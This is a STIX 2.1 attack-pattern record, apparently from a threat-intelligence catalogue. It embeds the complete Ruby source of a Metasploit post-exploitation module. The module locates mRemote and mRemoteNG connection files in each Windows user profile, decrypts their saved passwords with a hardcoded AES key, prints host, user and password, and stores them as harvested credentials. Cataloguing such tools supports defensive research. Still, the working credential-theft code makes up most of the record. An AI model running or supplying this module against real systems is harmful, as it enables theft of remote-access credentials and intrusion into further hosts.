{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7e671ad6-b731-4de8-a743-8c00e94fc6d1",
    "created": "2024-08-14T16:33:08.253431Z",
    "modified": "2024-08-14T16:33:08.253435Z",
    "name": "Windows Gather mRemote Saved Password Extraction",
    "description": " This module extracts saved passwords from mRemote. mRemote stores connections for RDP, VNC, SSH, Telnet, rlogin and other protocols. It saves the passwords in an encrypted format. The module will extract the connection info and decrypt the saved passwords.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/mremote.rb",
            "external_id": "mremote.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::UserProfiles\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather mRemote Saved Password Extraction',\n        'Description' => %q{\n          This module extracts saved passwords from mRemote. mRemote stores\n          connections for RDP, VNC, SSH, Telnet, rlogin and other protocols. It saves\n          the passwords in an encrypted format. The module will extract the connection\n          info and decrypt the saved passwords.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'theLightCosine',\n          'hdm', # Helped write the Decryption Routine\n          'mubix' # Helped write the Decryption Routine\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n  end\n\n  def run\n    @secret = \"\\xc8\\xa3\\x9d\\xe2\\xa5\\x47\\x66\\xa0\\xda\\x87\\x5f\\x79\\xaa\\xf1\\xaa\\x8c\"\n\n    grab_user_profiles.each do |user|\n      next if user['LocalAppData'].nil?\n\n      tmpath = user['LocalAppData'] + '\\\\Felix_Deimel\\\\mRemote\\\\confCons.xml'\n      ng_path = user['AppData'] + '\\\\mRemoteNG\\\\confCons.xml'\n      get_xml(tmpath)\n      get_xml(ng_path)\n    end\n  end\n\n  def get_xml(path)\n    print_status(\"Looking for #{path}\")\n    begin\n      if file_exist?(path)\n        condata = read_file(path)\n        loot_path = store_loot('mremote.creds', 'text/xml', session, condata, path)\n        vprint_good(\"confCons.xml saved to #{loot_path}\")\n        parse_xml(condata)\n        print_status(\"Finished processing #{path}\")\n      end\n    rescue Rex::Post::Meterpreter::RequestError\n      print_status(\"The file #{path} either could not be read or does not exist\")\n      return\n    end\n  end\n\n  def parse_xml(data)\n    mxml = REXML::Document.new(data).root\n    mxml.elements.to_a('//Node').each do |node|\n      host = node.attributes['Hostname']\n      port = node.attributes['Port']\n      proto = node.attributes['Protocol']\n      user = node.attributes['Username']\n      domain = node.attributes['Domain']\n      epassword = node.attributes['Password']\n      next if epassword.nil? || epassword == ''\n\n      decoded = epassword.unpack('m*')[0]\n      iv = decoded.slice!(0, 16)\n      pass = decrypt(decoded, @secret, iv, 'AES-128-CBC')\n      print_good(\"HOST: #{host} PORT: #{port} PROTOCOL: #{proto} Domain: #{domain} USER: #{user} PASS: #{pass}\")\n\n      service_data = {\n        address: host,\n        port: port,\n        service_name: proto,\n        protocol: 'tcp',\n        workspace_id: myworkspace_id\n      }\n\n      credential_data = {\n        origin_type: :session,\n        session_id: session_db_id,\n        post_reference_name: refname,\n        private_type: :password,\n        private_data: pass,\n        username: user\n      }\n\n      if domain.present?\n        credential_data[:realm_key] = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN\n        credential_data[:realm_value] = domain\n      end\n\n      credential_data.merge!(service_data)\n\n      # Create the Metasploit::Credential::Core object\n      credential_core = create_credential(credential_data)\n\n      # Assemble the options hash for creating the Metasploit::Credential::Login object\n      login_data = {\n        core: credential_core,\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }\n\n      # Merge in the service data and create our Login\n      login_data.merge!(service_data)\n      create_credential_login(login_data)\n    end\n  end\n\n  def decrypt(encrypted_data, key, iv, cipher_type)\n    aes = OpenSSL::Cipher.new(cipher_type)\n    aes.decrypt\n    aes.key = key\n    aes.iv = iv if !iv.nil?\n    aes.update(encrypted_data) + aes.final\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}